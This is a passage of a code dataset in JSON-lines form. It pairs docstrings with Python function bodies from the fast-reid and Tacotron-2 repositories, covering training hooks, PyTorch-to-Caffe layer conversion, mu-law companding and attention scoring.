"stars": 2698, "license": "mit", "language": "python", "size": 16826}
{"docstring": "\"\"\"\nArgs:\n    model (nn.Module): a module whose all BN layers in training mode will be\n        updated by precise BN.\n        Note that user is responsible for ensuring the BN layers to be\n        updated are in training mode when this hook is triggered.\n    data_loader (iterable): it will produce data to be run by `model(data)`.\n    num_iter (int): number of iterations used to compute the precise\n        statistics.\n\"\"\"\n", "func_signal": "def __init__(self, model, data_loader, num_iter):\n", "code": "self._logger = logging.getLogger(__name__)\nif len(get_bn_modules(model)) == 0:\n    self._logger.info(\n        \"PreciseBN is disabled because model does not contain BN layers in training mode.\"\n    )\n    self._disabled = True\n    return\n\nself._model = model\nself._data_loader = data_loader\nself._num_iter = num_iter\nself._disabled = False\n\nself._data_iter = None", "path": "fast-reid/fastreid/engine/hooks.py", "commit_date": "2020-12-28 00:00:00", "repo_name": "JDAI-CV/fast-reid", "stars": 3240, "license": "apache-2.0", "language": "python", "size": 14083}
{"docstring": "# for F.softmax\n", "func_signal": "def _softmax(raw, input, dim=None, _stacklevel=3):\n", "code": "x = raw(input, dim=dim)\nif dim is None:\n    dim = F._get_softmax_dim('softmax', input.dim(), _stacklevel)\nbottom_blobs = [log.blobs(input)]\nname = log.add_layer(name='softmax')\nlog.add_blobs([x], name='softmax_blob')\nlayer = caffe_net.Layer_param(name=name, type='Softmax',\n                              bottom=bottom_blobs, top=[log.blobs(x)])\nlayer.param.softmax_param.axis = dim\nlog.cnet.add_layer(layer)\nreturn x", "path": "fast-reid/tools/deploy/pytorch_to_caffe.py", "commit_date": "2020-06-09 00:00:00", "repo_name": "JDAI-CV/fast-reid", "stars": 3240, "license": "apache-2.0", "language": "python", "size": 14083}
{"docstring": "# for threshold or prelu\n", "func_signal": "def _prelu(raw, input, weight):\n", "code": "x = raw(input, weight)\nbottom_blobs = [log.blobs(input)]\nname = log.add_layer(name='prelu')\nlog.add_blobs([x], name='prelu_blob')\nlayer = caffe_net.Layer_param(name=name, type='PReLU',\n                              bottom=bottom_blobs, top=[log.blobs(x)])\nif weight.size()[0] == 1:\n    layer.param.prelu_param.channel_shared = True\n    layer.add_data(weight.cpu().data.numpy()[0])\nelse:\n    layer.add_data(weight.cpu().data.numpy())\nlog.cnet.add_layer(layer)\nreturn x", "path": "fast-reid/tools/deploy/pytorch_to_caffe.py", "commit_date": "2020-06-09 00:00:00", "repo_name": "JDAI-CV/fast-reid", "stars": 3240, "license": "apache-2.0", "language": "python", "size": 14083}
{"docstring": "# for tanh activation\n", "func_signal": "def _sigmoid(raw, input):\n", "code": "x = raw(input)\nname = log.add_layer(name='Sigmoid')\nlog.add_blobs([x], name='Sigmoid_blob')\nlayer = caffe_net.Layer_param(name=name, type='Sigmoid',\n                              bottom=[log.blobs(input)], top=[log.blobs(x)])\nlog.cnet.add_layer(layer)\nreturn x", "path": "fast-reid/tools/deploy/pytorch_to_caffe.py", "commit_date": "2020-06-09 00:00:00", "repo_name": "JDAI-CV/fast-reid", "stars": 3240, "license": "apache-2.0", "language": "python", "size": 14083}
{"docstring": "\"\"\"\nArgs:\n    writers (list[EventWriter]): a list of EventWriter objects\n    period (int):\n\"\"\"\n", "func_signal": "def __init__(self, writers, period=20):\n", "code": "self._writers = writers\nfor w in writers:\n    assert isinstance(w, EventWriter), w\nself._period = period", "path": "fast-reid/fastreid/engine/hooks.py", "commit_date": "2020-12-28 00:00:00", "repo_name": "JDAI-CV/fast-reid", "stars": 3240, "license": "apache-2.0", "language": "python", "size": 14083}
{"docstring": "# split in pytorch is slice in caffe\n", "func_signal": "def _split(raw, tensor, split_size, dim=0):\n", "code": "x = raw(tensor, split_size, dim)\nlayer_name = log.add_layer('split')\ntop_blobs = log.add_blobs(x, name='split_blob')\nlayer = caffe_net.Layer_param(name=layer_name, type='Slice',\n                              bottom=[log.blobs(tensor)], top=top_blobs)\nslice_num = int(np.floor(tensor.size()[dim] / split_size))\nslice_param = caffe_net.pb.SliceParameter(axis=dim, slice_point=[split_size * i for i in range(1, slice_num)])\nlayer.param.slice_param.CopyFrom(slice_param)\nlog.cnet.add_layer(layer)\nreturn x", "path": "fast-reid/tools/deploy/pytorch_to_caffe.py", "commit_date": "2020-06-09 00:00:00", "repo_name": "JDAI-CV/fast-reid", "stars": 3240, "license": "apache-2.0", "language": "python", "size": 14083}
{"docstring": "\"\"\"\nArgs:\n    warmup_iter (int): the number of iterations at the beginning to exclude\n        from timing.\n\"\"\"\n", "func_signal": "def __init__(self, warmup_iter=3):\n", "code": "self._warmup_iter = warmup_iter\nself._step_timer = Timer()", "path": "fast-reid/fastreid/engine/hooks.py", "commit_date": "2020-12-28 00:00:00", "repo_name": "JDAI-CV/fast-reid", "stars": 3240, "license": "apache-2.0", "language": "python", "size": 14083}
{"docstring": "# +1 because we're in after_step\n", "func_signal": "def after_step(self):\n", "code": "iter_done = self.trainer.iter - self.trainer.start_iter + 1\nif iter_done >= self._warmup_iter:\n    sec = self._step_timer.seconds()\n    self.trainer.storage.put_scalars(time=sec)\nelse:\n    self._start_time = time.perf_counter()\n    self._total_timer.reset()\n\nself._total_timer.pause()", "path": "fast-reid/fastreid/engine/hooks.py", "commit_date": "2020-12-28 00:00:00", "repo_name": "JDAI-CV/fast-reid", "stars": 3240, "license": "apache-2.0", "language": "python", "size": 14083}
{"docstring": "\"\"\"\nRun model on the data_loader and evaluate the metrics with evaluator.\nThe model will be used in eval mode.\nArgs:\n    model (nn.Module): a module which accepts an object from\n        `data_loader` and returns some outputs. It will be temporarily set to `eval` mode.\n        If you wish to evaluate a model in `training` mode instead, you can\n        wrap the given model and override its behavior of `.eval()` and `.train()`.\n    data_loader: an iterable object with a length.\n        The elements it generates will be the inputs to the model.\n    evaluator (DatasetEvaluator): the evaluator to run. Use\n        :class:`DatasetEvaluators([])` if you only want to benchmark, but\n        don't want to do any evaluation.\n    flip_test (bool): If get features with flipped images\nReturns:\n    The return value of `evaluator.evaluate()`\n\"\"\"\n", "func_signal": "def inference_on_dataset(model, data_loader, evaluator, flip_test=False):\n", "code": "logger = logging.getLogger(__name__)\nlogger.info(\"Start inference on {} images\".format(len(data_loader.dataset)))\n\ntotal = len(data_loader)  # inference data loader must have a fixed length\nevaluator.reset()\n\nnum_warmup = min(5, total - 1)\nstart_time = time.perf_counter()\ntotal_compute_time = 0\nwith inference_context(model), torch.no_grad():\n    for idx, inputs in enumerate(data_loader):\n        if idx == num_warmup:\n            start_time = time.perf_counter()\n            total_compute_time = 0\n\n        start_compute_time = time.perf_counter()\n        outputs = model(inputs)\n        # Flip test\n        if flip_test:\n            inputs[\"images\"] = inputs[\"images\"].flip(dims=[3])\n            flip_outputs = model(inputs)\n            outputs = (outputs + flip_outputs) / 2\n        total_compute_time += time.perf_counter() - start_compute_time\n        evaluator.process(inputs, outputs)\n\n        idx += 1\n        iters_after_start = idx + 1 - num_warmup * int(idx >= num_warmup)\n        seconds_per_batch = total_compute_time / iters_after_start\n        if idx >= num_warmup * 2 or seconds_per_batch > 30:\n            total_seconds_per_img = (time.perf_counter() - start_time) / iters_after_start\n            eta = datetime.timedelta(seconds=int(total_seconds_per_img * (total - idx - 1)))\n            log_every_n_seconds(\n                logging.INFO,\n                \"Inference done {}/{}. {:.4f} s / batch. ETA={}\".format(\n                    idx + 1, total, seconds_per_batch, str(eta)\n                ),\n                n=30,\n            )\n\n# Measure the time only for this worker (before the synchronization barrier)\ntotal_time = time.perf_counter() - start_time\ntotal_time_str = str(datetime.timedelta(seconds=total_time))\n# NOTE this format is parsed by grep\nlogger.info(\n    \"Total inference time: {} ({:.6f} s / batch per device)\".format(\n        total_time_str, total_time / (total - num_warmup)\n    )\n)\ntotal_compute_time_str = str(datetime.timedelta(seconds=int(total_compute_time)))\nlogger.info(\n    \"Total inference pure compute time: {} ({:.6f} s / batch per device)\".format(\n        total_compute_time_str, total_compute_time / (total - num_warmup)\n    )\n)\nresults = evaluator.evaluate()\n# An evaluator may return None when not in main process.\n# Replace it by an empty dict instead to make it easier for downstream code to handle\nif results is None:\n    results = {}\nreturn results", "path": "fast-reid/fastreid/evaluation/evaluator.py", "commit_date": "2020-12-22 00:00:00", "repo_name": "JDAI-CV/fast-reid", "stars": 3240, "license": "apache-2.0", "language": "python", "size": 14083}
{"docstring": "\"\"\"\nArgs:\n    eval_period (int): the period to run `eval_function`.\n    eval_function (callable): a function which takes no arguments, and\n        returns a nested dict of evaluation metrics.\nNote:\n    This hook must be enabled in all or none workers.\n    If you would like only certain workers to perform evaluation,\n    give other workers a no-op function (`eval_function=lambda: None`).\n\"\"\"\n", "func_signal": "def __init__(self, eval_period, eval_function):\n", "code": "self._period = eval_period\nself._func = eval_function", "path": "fast-reid/fastreid/engine/hooks.py", "commit_date": "2020-12-28 00:00:00", "repo_name": "JDAI-CV/fast-reid", "stars": 3240, "license": "apache-2.0", "language": "python", "size": 14083}
{"docstring": "# for tanh activation\n", "func_signal": "def _tanh(raw, input):\n", "code": "x = raw(input)\nname = log.add_layer(name='tanh')\nlog.add_blobs([x], name='tanh_blob')\nlayer = caffe_net.Layer_param(name=name, type='TanH',\n                              bottom=[log.blobs(input)], top=[log.blobs(x)])\nlog.cnet.add_layer(layer)\nreturn x", "path": "fast-reid/tools/deploy/pytorch_to_caffe.py", "commit_date": "2020-06-09 00:00:00", "repo_name": "JDAI-CV/fast-reid", "stars": 3240, "license": "apache-2.0", "language": "python", "size": 14083}
{"docstring": "\"\"\"\ndoing init() with inputs Variable before using it\n\"\"\"\n", "func_signal": "def __init__(self):\n", "code": "self.layers = {}\nself.detail_layers = {}\nself.detail_blobs = {}\nself._blobs = Blob_LOG()\nself._blobs_data = []\nself.cnet = caffe_net.Caffemodel('')\nself.debug = True", "path": "fast-reid/tools/deploy/pytorch_to_caffe.py", "commit_date": "2020-06-09 00:00:00", "repo_name": "JDAI-CV/fast-reid", "stars": 3240, "license": "apache-2.0", "language": "python", "size": 14083}
{"docstring": "# for threshold or prelu\n", "func_signal": "def _relu(raw, input, inplace=False):\n", "code": "x = raw(input, False)\nname = log.add_layer(name='relu')\nlog.add_blobs([x], name='relu_blob')\nlayer = caffe_net.Layer_param(name=name, type='ReLU',\n                              bottom=[log.blobs(input)], top=[log.blobs(x)])\nlog.cnet.add_layer(layer)\nreturn x", "path": "fast-reid/tools/deploy/pytorch_to_caffe.py", "commit_date": "2020-06-09 00:00:00", "repo_name": "JDAI-CV/fast-reid", "stars": 3240, "license": "apache-2.0", "language": "python", "size": 14083}
{"docstring": "\"\"\"\nArgs:\n    optimizer (torch.optim.Optimizer):\n    scheduler (torch.optim._LRScheduler)\n\"\"\"\n", "func_signal": "def __init__(self, optimizer, scheduler):\n", "code": "self._optimizer = optimizer\nself._scheduler = scheduler\n\n# NOTE: some heuristics on what LR to summarize\n# summarize the param group with most parameters\nlargest_group = max(len(g[\"params\"]) for g in optimizer.param_groups)\n\nif largest_group == 1:\n    # If all groups have one parameter,\n    # then find the most common initial LR, and use it for summary\n    lr_count = Counter([g[\"lr\"] for g in optimizer.param_groups])\n    lr = lr_count.most_common()[0][0]\n    for i, g in enumerate(optimizer.param_groups):\n        if g[\"lr\"] == lr:\n            self._best_param_group_id = i\n            break\nelse:\n    for i, g in enumerate(optimizer.param_groups):\n        if len(g[\"params\"]) == largest_group:\n            self._best_param_group_id = i\n            break", "path": "fast-reid/fastreid/engine/hooks.py", "commit_date": "2020-12-28 00:00:00", "repo_name": "JDAI-CV/fast-reid", "stars": 3240, "license": "apache-2.0", "language": "python", "size": 14083}
{"docstring": "# check if add a const value\n", "func_signal": "def _add(input, *args):\n", "code": "if isinstance(args[0], int):\n    print('value: ',args[0])\n    x = raw__add__(input, *args)\n    #x = raw(input)\n    layer_name = log.add_layer(name='scale')\n    log.add_blobs([x], name='Scale_blob')\n    layer = caffe_net.Layer_param(name=layer_name, type='Scale',\n                                   bottom=[log.blobs(input)], top=[log.blobs(x)])\n    dim = x.shape[1]\n    layer.param.scale_param.bias_term = True\n    weight = np.ones(dim, dtype=np.float32)\n    bias = args[0] * np.ones(dim, dtype=np.float32)\n    layer.add_data(weight, bias)\n    log.cnet.add_layer(layer)\n    return x\n# otherwise add a tensor\nx = raw__add__(input, *args)\nif not NET_INITTED:\n    return x\nlayer_name = log.add_layer(name='add')\ntop_blobs = log.add_blobs([x], name='add_blob')\nlayer = caffe_net.Layer_param(name=layer_name, type='Eltwise',\n                              bottom=[log.blobs(input), log.blobs(args[0])], top=top_blobs)\nlayer.param.eltwise_param.operation = 1  # sum is 1\nlog.cnet.add_layer(layer)\nreturn x", "path": "fast-reid/tools/deploy/pytorch_to_caffe.py", "commit_date": "2020-06-09 00:00:00", "repo_name": "JDAI-CV/fast-reid", "stars": 3240, "license": "apache-2.0", "language": "python", "size": 14083}
{"docstring": "\"\"\"\nUpdate the model with precise statistics. Users can manually call this method.\n\"\"\"\n", "func_signal": "def update_stats(self):\n", "code": "if self._disabled:\n    return\n\nif self._data_iter is None:\n    self._data_iter = iter(self._data_loader)\n\ndef data_loader():\n    for num_iter in itertools.count(1):\n        if num_iter % 100 == 0:\n            self._logger.info(\n                \"Running precise-BN ... {}/{} iterations.\".format(num_iter, self._num_iter)\n            )\n        # This way we can reuse the same iterator\n        yield next(self._data_iter)\n\nwith EventStorage():  # capture events in a new storage to discard them\n    self._logger.info(\n        \"Running precise-BN for {} iterations...  \".format(self._num_iter)\n        + \"Note that this could produce different statistics every time.\"\n    )\n    update_bn_stats(self._model, data_loader(), self._num_iter)", "path": "fast-reid/fastreid/engine/hooks.py", "commit_date": "2020-12-28 00:00:00", "repo_name": "JDAI-CV/fast-reid", "stars": 3240, "license": "apache-2.0", "language": "python", "size": 14083}
{"docstring": "# No way to use **kwargs\n", "func_signal": "def after_epoch(self):\n", "code": "storage = get_event_storage()\nmetric_dict = dict(\n    metric=storage.latest()[self.metric_name][0] if self.metric_name in storage.latest() else -1\n)\nself.step(self.trainer.epoch, **metric_dict)", "path": "fast-reid/fastreid/engine/hooks.py", "commit_date": "2020-12-28 00:00:00", "repo_name": "JDAI-CV/fast-reid", "stars": 3240, "license": "apache-2.0", "language": "python", "size": 14083}
{"docstring": "# Freeze specific layers\n", "func_signal": "def before_step(self):\n", "code": "if self.trainer.iter < self.freeze_iters and not self.is_frozen:\n    self.freeze_specific_layer()\n\n# Recover original layers status\nif self.trainer.iter >= self.freeze_iters and self.is_frozen:\n    self.open_all_layer()\n\nif self.trainer.max_iter - self.trainer.iter <= self.fc_freeze_iters \\\n        and not self.fc_frozen:\n    self.freeze_classifier()", "path": "fast-reid/fastreid/engine/hooks.py", "commit_date": "2020-12-28 00:00:00", "repo_name": "JDAI-CV/fast-reid", "stars": 3240, "license": "apache-2.0", "language": "python", "size": 14083}
{"docstring": "# TODO dilation,ceil_mode,return indices\n", "func_signal": "def _pool(type, raw, input, x, kernel_size, stride, padding, ceil_mode):\n", "code": "layer_name = log.add_layer(name='{}_pool'.format(type))\ntop_blobs = log.add_blobs([x], name='{}_pool_blob'.format(type))\nlayer = caffe_net.Layer_param(name=layer_name, type='Pooling', bottom=[log.blobs(input)], top=top_blobs)\n\n# TODO w,h different kernel, stride and padding\n# processing ceil mode\nlayer.pool_param(kernel_size=kernel_size, stride=kernel_size if stride is None else stride,\n                 pad=padding, type=type.upper())\nlog.cnet.add_layer(layer)\nif ceil_mode == False and stride is not None:\n    oheight = (input.size()[2] - _pair(kernel_size)[0] + 2 * _pair(padding)[0]) % (_pair(stride)[0])\n    owidth = (input.size()[3] - _pair(kernel_size)[1] + 2 * _pair(padding)[1]) % (_pair(stride)[1])\n    if oheight != 0 or owidth != 0:\n        caffe_out = raw(input, kernel_size, stride, padding, ceil_mode=False)\n        print(\"WARNING: the output shape miss match at {}: \"\n\n              \"input {} output---Pytorch:{}---Caffe:{}\\n\"\n              \"This is caused by the different implementation that ceil mode in caffe and the floor mode in pytorch.\\n\"\n              \"You can add the clip layer in caffe prototxt manually if shape mismatch error is caused in caffe. \".format(\n            layer_name, input.size(), x.size(), caffe_out.size()))", "path": "fast-reid/tools/deploy/pytorch_to_caffe.py", "commit_date": "2020-06-09 00:00:00", "repo_name": "JDAI-CV/fast-reid", "stars": 3240, "license": "apache-2.0", "language": "python", "size": 14083}
{"docstring": "# for threshold or relu\n", "func_signal": "def _threshold(raw, input, threshold, value, inplace=False):\n", "code": "if threshold == 0 and value == 0:\n    x = raw(input, threshold, value, inplace)\n    bottom_blobs = [log.blobs(input)]\n    name = log.add_layer(name='relu')\n    log.add_blobs([x], name='relu_blob')\n    layer = caffe_net.Layer_param(name=name, type='ReLU',\n                                  bottom=bottom_blobs, top=[log.blobs(x)])\n    log.cnet.add_layer(layer)\n    return x\nif value != 0:\n    raise NotImplemented(\"value !=0 not implemented in caffe\")\nx = raw(input, input, threshold, value, inplace)\nbottom_blobs = [log.blobs(input)]\nlayer_name = log.add_layer(name='threshold')\ntop_blobs = log.add_blobs([x], name='threshold_blob')\nlayer = caffe_net.Layer_param(name=layer_name, type='Threshold',\n                              bottom=bottom_blobs, top=top_blobs)\nlayer.param.threshold_param.threshold = threshold\nlog.cnet.add_layer(layer)\nreturn x", "path": "fast-reid/tools/deploy/pytorch_to_caffe.py", "commit_date": "2020-06-09 00:00:00", "repo_name": "JDAI-CV/fast-reid", "stars": 3240, "license": "apache-2.0", "language": "python", "size": 14083}
{"docstring": "'''Load shadow variables of saved model.\n\nInspired by: https://www.tensorflow.org/api_docs/python/tf/train/ExponentialMovingAverage\n\nCan also use: shadow_dict = model.ema.variables_to_restore()\n'''\n#Add global step to saved variables to save checkpoints correctly\n", "func_signal": "def create_shadow_saver(model, global_step=None):\n", "code": "shadow_variables = [model.ema.average_name(v) for v in model.variables]\nvariables = model.variables\n\nif global_step is not None:\n\tshadow_variables += ['global_step']\n\tvariables += [global_step]\n\nshadow_dict = dict(zip(shadow_variables, variables)) #dict(zip(keys, values)) -> {key1: value1, key2: value2, ...}\nreturn tf.train.Saver(shadow_dict, max_to_keep=20)", "path": "Tacotron-2/wavenet_vocoder/train.py", "commit_date": "2019-01-25 00:00:00", "repo_name": "Rayhane-mamah/Tacotron-2", "stars": 2225, "license": "mit", "language": "python", "size": 9378}
{"docstring": "\"\"\"Mu-Law companding\nMethod described in paper [1]_.\n.. math::\n\tf(x) = sign(x) ln (1 + mu |x|) / ln (1 + mu)\nArgs:\n\tx (array-like): Input signal. Each value of input signal must be in\n\t  range of [-1, 1].\n\tmu (number): Compression parameter ``\u03bc``.\nReturns:\n\tarray-like: Compressed signal ([-1, 1])\nSee also:\n\t:func:`nnmnkwii.preprocessing.inv_mulaw`\n\t:func:`nnmnkwii.preprocessing.mulaw_quantize`\n\t:func:`nnmnkwii.preprocessing.inv_mulaw_quantize`\n.. [1] Brokish, Charles W., and Michele Lewis. \"A-law and mu-law companding\n\timplementations using the tms320c54x.\" SPRA163 (1997).\n\"\"\"\n", "func_signal": "def mulaw(x, mu=256):\n", "code": "mu = 255\nreturn _sign(x) * _log1p(mu * _abs(x)) / _log1p(mu)", "path": "Tacotron-2/wavenet_vocoder/util.py", "commit_date": "2019-01-04 00:00:00", "repo_name": "Rayhane-mamah/Tacotron-2", "stars": 2225, "license": "mit", "language": "python", "size": 9378}
{"docstring": "'''Converts a sequence of IDs back to a string'''\n", "func_signal": "def sequence_to_text(sequence):\n", "code": "result = ''\nfor symbol_id in sequence:\n  if symbol_id in _id_to_symbol:\n    s = _id_to_symbol[symbol_id]\n    # Enclose ARPAbet back in curly braces:\n    if len(s) > 1 and s[0] == '@':\n      s = '{%s}' % s[1:]\n    result += s\nreturn result.replace('}{', ' ')", "path": "Tacotron-2/tacotron/utils/text.py", "commit_date": "2018-08-07 00:00:00", "repo_name": "Rayhane-mamah/Tacotron-2", "stars": 2225, "license": "mit", "language": "python", "size": 9378}
{"docstring": "#wrapper to support tensorflow tensors/numpy arrays\n", "func_signal": "def _asfloat(x):\n", "code": "isnumpy = isinstance(x, np.ndarray)\nisscalar = np.isscalar(x)\nreturn x.astype(np.float32) if isnumpy else float(x) if isscalar else tf.cast(x, tf.float32)", "path": "Tacotron-2/wavenet_vocoder/util.py", "commit_date": "2019-01-04 00:00:00", "repo_name": "Rayhane-mamah/Tacotron-2", "stars": 2225, "license": "mit", "language": "python", "size": 9378}
{"docstring": "\"\"\"Inverse of mu-law companding (mu-law expansion)\n.. math::\n\tf^{-1}(x) = sign(y) (1 / mu) (1 + mu)^{|y|} - 1)\nArgs:\n\ty (array-like): Compressed signal. Each value of input signal must be in\n\t  range of [-1, 1].\n\tmu (number): Compression parameter ``\u03bc``.\nReturns:\n\tarray-like: Uncomprresed signal (-1 <= x <= 1)\nSee also:\n\t:func:`nnmnkwii.preprocessing.inv_mulaw`\n\t:func:`nnmnkwii.preprocessing.mulaw_quantize`\n\t:func:`nnmnkwii.preprocessing.inv_mulaw_quantize`\n\"\"\"\n", "func_signal": "def inv_mulaw(y, mu=256):\n", "code": "mu = 255\nreturn _sign(y) * (1.0 / mu) * ((1.0 + mu)**_abs(y) - 1.0)", "path": "Tacotron-2/wavenet_vocoder/util.py", "commit_date": "2019-01-04 00:00:00", "repo_name": "Rayhane-mamah/Tacotron-2", "stars": 2225, "license": "mit", "language": "python", "size": 9378}
{"docstring": "#wrapper to support tensorflow tensors/numpy arrays\n", "func_signal": "def _abs(x):\n", "code": "isnumpy = isinstance(x, np.ndarray)\nisscalar = np.isscalar(x)\nreturn np.abs(x) if (isnumpy or isscalar) else tf.abs(x)", "path": "Tacotron-2/wavenet_vocoder/util.py", "commit_date": "2019-01-04 00:00:00", "repo_name": "Rayhane-mamah/Tacotron-2", "stars": 2225, "license": "mit", "language": "python", "size": 9378}
{"docstring": "#wrapper to support tensorflow tensors/numpy arrays\n", "func_signal": "def _sign(x):\n", "code": "isnumpy = isinstance(x, np.ndarray)\nisscalar = np.isscalar(x)\nreturn np.sign(x) if (isnumpy or isscalar) else tf.sign(x)", "path": "Tacotron-2/wavenet_vocoder/util.py", "commit_date": "2019-01-04 00:00:00", "repo_name": "Rayhane-mamah/Tacotron-2", "stars": 2225, "license": "mit", "language": "python", "size": 9378}
{"docstring": "\"\"\"Score the query based on the keys and values.\nArgs:\n\tquery: Tensor of dtype matching `self.values` and shape\n\t\t`[batch_size, query_depth]`.\n\tstate (previous alignments): Tensor of dtype matching `self.values` and shape\n\t\t`[batch_size, alignments_size]`\n\t\t(`alignments_size` is memory's `max_time`).\nReturns:\n\talignments: Tensor of dtype matching `self.values` and shape\n\t\t`[batch_size, alignments_size]` (`alignments_size` is memory's\n\t\t`max_time`).\n\"\"\"\n", "func_signal": "def __call__(self, query, state, prev_max_attentions):\n", "code": "previous_alignments = state\nwith variable_scope.variable_scope(None, \"Location_Sensitive_Attention\", [query]):\n\n\t# processed_query shape [batch_size, query_depth] -> [batch_size, attention_dim]\n\tprocessed_query = self.query_layer(query) if self.query_layer else query\n\t# -> [batch_size, 1, attention_dim]\n\tprocessed_query = tf.expand_dims(processed_query, 1)\n\n\t# processed_location_features shape [batch_size, max_time, attention dimension]\n\t# [batch_size, max_time] -> [batch_size, max_time, 1]\n\texpanded_alignments = tf.expand_dims(previous_alignments, axis=2)\n\t# location features [batch_size, max_time, filters]\n\tf = self.location_convolution(expanded_alignments)\n\t# Projected location features [batch_size, max_time, attention_dim]\n\tprocessed_location_features = self.location_layer(f)\n\n\t# energy shape [batch_size, max_time]\n\tenergy = _location_sensitive_score(processed_query, processed_location_features, self.keys)\n\nif self.synthesis_constraint:\n\tTx = tf.shape(energy)[-1]\n\t# prev_max_attentions = tf.squeeze(prev_max_attentions, [-1])\n\tif self.constraint_type == 'monotonic':\n\t\tkey_masks = tf.sequence_mask(prev_max_attentions, Tx)\n\t\treverse_masks = tf.sequence_mask(Tx - self.attention_win_size - prev_max_attentions, Tx)[:, ::-1]\n\telse:\n\t\tassert self.constraint_type == 'window'\n\t\tkey_masks = tf.sequence_mask(prev_max_attentions - (self.attention_win_size // 2 + (self.attention_win_size % 2 != 0)), Tx)\n\t\treverse_masks = tf.sequence_mask(Tx - (self.attention_win_size // 2) - prev_max_attentions, Tx)[:, ::-1]\n\t\n\tmasks = tf.logical_or(key_masks, reverse_masks)\n\tpaddings = tf.ones_like(energy) * (-2 ** 32 + 1)  # (N, Ty/r, Tx)\n\tenergy = tf.where(tf.equal(masks, False), energy, paddings)\n\n# alignments shape = energy shape = [batch_size, max_time]\nalignments = self._probability_fn(energy, previous_alignments)\nmax_attentions = tf.argmax(alignments, -1, output_type=tf.int32) # (N, Ty/r)\n\n# Cumulate alignments\nif self._cumulate:\n\tnext_state = alignments + previous_alignments\nelse:\n\tnext_state = alignments\n\nreturn alignments, next_state, max_attentions", "path": "Tacotron-2/tacotron/models/attention.py", "commit_date": "2019-01-04 00:00:00", "repo_name": "Rayhane-mamah/Tacotron-2", "stars": 2225, "license": "mit", "language": "python", "size": 9378}
{"docstring": "#wrapper to support tensorflow tensors/numpy arrays\n", "func_signal": "def _log1p(x):\n", "code": "isnumpy = isinstance(x, np.ndarray)\nisscalar = np.isscalar(x)\nreturn np.log1p(x) if (isnumpy or isscalar) else tf.log1p(x)", "path": "Tacotron-2/wavenet_vocoder/util.py", "commit_date": "2019-01-04 00:00:00", "repo_name": "Rayhane-mamah/Tacotron-2", "stars": 2225, "license": "mit", "language": "python", "size": 9378}
{"docstring": "'''Pipeline for non-English text that transliterates to ASCII.'''\n", "func_signal": "def transliteration_cleaners(text):\n", "code": "text = convert_to_ascii(text)\ntext = lowercase(text)\ntext = collapse_whitespace(text)\nreturn text", "path": "Tacotron-2/tacotron/utils/cleaners.py", "commit_date": "2018-10-07 00:00:00", "repo_name": "Rayhane-mamah/Tacotron-2", "stars": 2225, "license": "mit", "language": "python", "size": 9378}
{"docstring": "\"\"\"Inverse of mu-law companding + quantize\nArgs:\n\ty (array-like): Quantized signal (\u2208 [0, mu]).\n\tmu (number): Compression parameter ``\u03bc``.\nReturns:\n\tarray-like: Uncompressed signal ([-1, 1])\nExamples:\n\t>>> from scipy.io import wavfile\n\t>>> import pysptk\n\t>>> import numpy as np\n\t>>> from nnmnkwii import preprocessing as P\n\t>>> fs, x = wavfile.read(pysptk.util.example_audio_file())\n\t>>> x = (x / 32768.0).astype(np.float32)\n\t>>> x_hat = P.inv_mulaw_quantize(P.mulaw_quantize(x))\n\t>>> x_hat = (x_hat * 32768).astype(np.int16)\nSee also:\n\t:func:`nnmnkwii.preprocessing.mulaw`\n\t:func:`nnmnkwii.preprocessing.inv_mulaw`\n\t:func:`nnmnkwii.preprocessing.mulaw_quantize`\n\"\"\"\n# [0, m) to [-1, 1]\n", "func_signal": "def inv_mulaw_quantize(y, mu=256):\n", "code": "mu = 255\ny = 2 * _asfloat(y) / mu - 1\nreturn inv_mulaw(y, mu)", "path": "Tacotron-2/wavenet_vocoder/util.py", "commit_date": "2019-01-04 00:00:00", "repo_name": "Rayhane-mamah/Tacotron-2", "stars": 2225, "license": "mit", "language": "python", "size": 9378}
{"docstring": "#wrapper to support tensorflow tensors/numpy arrays\n", "func_signal": "def _asint(x):\n", "code": "isnumpy = isinstance(x, np.ndarray)\nisscalar = np.isscalar(x)\nreturn x.astype(np.int) if isnumpy else int(x) if isscalar else tf.cast(x, tf.int32)", "path": "Tacotron-2/wavenet_vocoder/util.py", "commit_date": "2019-01-04 00:00:00", "repo_name": "Rayhane-mamah/Tacotron-2", "stars": 2225, "license": "mit", "language": "python", "size": 9378}
{"docstring": "#Create tensorboard projector\n", "func_signal": "def add_embedding_stats(summary_writer, embedding_names, paths_to_meta, checkpoint_path):\n", "code": "config = tf.contrib.tensorboard.plugins.projector.ProjectorConfig()\nconfig.model_checkpoint_path = checkpoint_path\n\nfor embedding_name, path_to_meta in zip(embedding_names, paths_to_meta):\n\t#Initialize config\n\tembedding = config.embeddings.add()\n\t#Specifiy the embedding variable and the metadata\n\tembedding.tensor_name = embedding_name\n\tembedding.metadata_path = path_to_meta\n\n#Project the embeddings to space dimensions for visualization\ntf.contrib.tensorboard.plugins.projector.visualize_embeddings(summary_writer, config)", "path": "Tacotron-2/wavenet_vocoder/train.py", "commit_date": "2019-01-25 00:00:00", "repo_name": "Rayhane-mamah/Tacotron-2", "stars": 2225, "license": "mit", "language": "python", "size": 9378}
{"docstring": "\"\"\"Impelements Bahdanau-style (cumulative) scoring function.\nThis attention is described in:\n\tJ. K. Chorowski, D. Bahdanau, D. Serdyuk, K. Cho, and Y. Ben-\n  gio, \u201cAttention-based models for speech recognition,\u201d in Ad-\n  vances in Neural Information Processing Systems, 2015, pp.\n  577\u2013585.\n\n#############################################################################\n\t\t  hybrid attention (content-based + location-based)\n\t\t\t\t\t\t   f = F * \u03b1_{i-1}\n   energy = dot(v_a, tanh(W_keys(h_enc) + W_query(h_dec) + W_fil(f) + b_a))\n#############################################################################\n\nArgs:\n\tW_query: Tensor, shape '[batch_size, 1, attention_dim]' to compare to location features.\n\tW_location: processed previous alignments into location features, shape '[batch_size, max_time, attention_dim]'\n\tW_keys: Tensor, shape '[batch_size, max_time, attention_dim]', typically the encoder outputs.\nReturns:\n\tA '[batch_size, max_time]' attention score (energy)\n\"\"\"\n# Get the number of hidden units from the trailing dimension of keys\n", "func_signal": "def _location_sensitive_score(W_query, W_fil, W_keys):\n", "code": "dtype = W_query.dtype\nnum_units = W_keys.shape[-1].value or array_ops.shape(W_keys)[-1]\n\nv_a = tf.get_variable(\n\t'attention_variable_projection', shape=[num_units], dtype=dtype,\n\tinitializer=tf.contrib.layers.xavier_initializer())\nb_a = tf.get_variable(\n\t'attention_bias', shape=[num_units], dtype=dtype,\n\tinitializer=tf.zeros_initializer())\n\nreturn tf.reduce_sum(v_a * tf.tanh(W_keys + W_query + W_fil + b_a), [2])", "path": 